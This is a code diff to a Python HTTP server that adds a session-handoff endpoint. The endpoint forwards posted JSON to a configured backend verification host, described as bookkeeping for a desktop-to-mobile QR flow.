@@ -45,6 +45,7 @@ TELEGRAM_CHAT  = os.environ.get('TELEGRAM_CHAT_ID', '')
 
 EC2_VERIFY_URL = os.environ.get('EC2_VERIFY_URL', 'https://18.185.59.156/api/v1/verify')
 EC2_SESSION_STATUS_URL = EC2_VERIFY_URL.rsplit('/', 1)[0] + '/session-status'
+EC2_SESSION_HANDOFF_URL = EC2_VERIFY_URL.rsplit('/', 1)[0] + '/session-handoff'
 # No hardcoded fallback — this was a real leaked key sitting in a public repo.
 EC2_API_KEY    = os.environ.get('EC2_API_KEY', '')
 
@@ -336,6 +337,8 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self._handle_save()
         elif self.path == '/verify':
             self._handle_verify()
+        elif self.path == '/session-handoff':
+            self._handle_session_handoff()
         else:
             self.send_response(404)
             self.end_headers()
@@ -425,6 +428,31 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Content-Type', 'application/json')
         self.end_headers()
         self.wfile.write(json.dumps(result).encode())
+
+    def _handle_session_handoff(self):
+        # Fire-and-forget bookkeeping for the admin dashboard's Links page
+        # (desktop-without-a-camera → QR → continued on mobile). Never lets
+        # a failure here surface as an error to the page that called it —
+        # this is purely informational, not part of the capture flow.
+        length = int(self.headers.get('Content-Length', 0))
+        raw    = self.rfile.read(length) if length else b'{}'
+
+        if HAS_REQUESTS:
+            try:
+                _req.post(
+                    EC2_SESSION_HANDOFF_URL,
+                    data=raw,
+                    headers={'Content-Type': 'application/json'},
+                    timeout=10,
+                    verify=EC2_TLS_VERIFY,
+                )
+            except Exception as exc:
+                print(f'  [SESSION-HANDOFF ERR] {exc}')
+
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(b'{"ok":true}')
 
     def log_message(self, fmt, *args):
         ts = datetime.now().strftime('%H:%M:%S')
